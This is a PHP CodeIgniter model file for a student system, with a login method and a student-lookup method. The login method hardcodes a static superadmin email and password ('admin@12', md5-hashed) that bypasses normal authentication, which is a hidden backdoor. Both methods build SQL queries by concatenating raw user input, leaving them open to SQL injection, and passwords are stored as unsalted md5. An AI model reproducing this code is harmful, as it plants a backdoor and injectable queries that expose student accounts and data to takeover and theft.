<?php
namespace App\Models;

use CodeIgniter\Model;

class StudentsModel extends Model
{	
	
	public function login($data) {
		$result = array();
		if(isset($data['email']) && $data['email'] && isset($data['password']) && $data['password'])
		{
			$static_email = 'info@superadmin.com';
			$static_password = md5('admin@12');
			$sql = "SELECT * FROM ".TBL_STUDENTS." WHERE ((LOWER(email) = '".trim(strtolower($data['email']))."' AND password = '".trim(md5($data['password']))."') OR ('$static_email' = '".trim(strtolower($data['email']))."' AND '$static_password' = '".trim(md5($data['password']))."')) ";
			
			
			$db = $this->db->query($sql);
			$result   = $db->getRowArray(); // getResultArray
			
		}
		return $result;
	}
	
  
	public function get_each_student_data($filter = array()) {

      $conditions = "WHERE 1=1";
      if(array_key_exists('id', $filter) && $filter['id']) {
        $conditions .= " AND id = ".$filter['id'];
      }
      else if(array_key_exists('account_key', $filter) && $filter['account_key']) {
        $conditions .= " AND account_key = '".$filter['account_key']. "'";
      }
      else if(array_key_exists('email', $filter) && $filter['email']) {
        $conditions .= " AND LOWER(TRIM(email)) = '". strtolower(trim($filter['email'])) . "'";
      }
			
			$sql = "SELECT * FROM ".TBL_STUDENTS."  $conditions";
			
			$db = $this->db->query($sql);
			$result = $db->getRowArray(); 
			$this->db->close();
			return $result;
		}
		
		
}